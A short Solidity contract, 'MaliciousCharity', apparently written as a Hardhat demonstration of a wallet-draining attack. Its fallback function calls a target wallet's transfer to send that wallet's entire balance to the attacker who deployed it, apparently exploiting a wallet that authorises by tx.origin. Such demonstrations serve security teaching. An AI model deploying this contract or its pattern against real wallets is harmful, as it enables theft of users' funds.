// SPDX-License-Identifier: MIT
pragma solidity ^0.8.13;

import "hardhat/console.sol";

interface ISmartWallet {
    function transfer(address payable _to, uint _amount) external;
}

contract MaliciousCharity {
    address payable private owner;
    ISmartWallet private wallet;

    constructor(address _vulnerableWallet) {
        owner = payable(msg.sender);
        console.log("owner", owner);

        wallet = ISmartWallet(_vulnerableWallet);
    }

    fallback() external payable {
        wallet.transfer(owner, address(wallet).balance);
    }
}
